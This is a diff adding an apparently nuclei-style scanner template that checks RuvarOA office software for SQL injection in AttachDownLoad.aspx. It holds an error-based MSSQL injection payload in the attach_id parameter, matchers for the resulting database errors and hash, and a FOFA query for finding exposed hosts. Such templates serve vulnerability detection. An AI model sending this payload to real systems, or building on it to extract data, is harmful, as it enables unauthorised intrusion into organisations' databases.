@@ -1,0 +1,30 @@
+id: poc-yaml-ruvaroa-attachdownload-aspx-sqli
+info:
+  name: RuvarOA AttachDownLoad SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: ruvar-oa
+    fofa: body="txt_admin_key"
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /Mobile/Bulletin/AttachDownLoad.aspx?attach_id=1%27%20and%20%28sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{t1}}%27))%29%3E0%29-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "在将 nvarchar 值"
+          - "转换成数据类型 int 时失败"
+          - "SqlException"
+      - type: regex
+        regex:
+          - "0x{{t2}}"
+      - type: status
+        status:
+          - 200
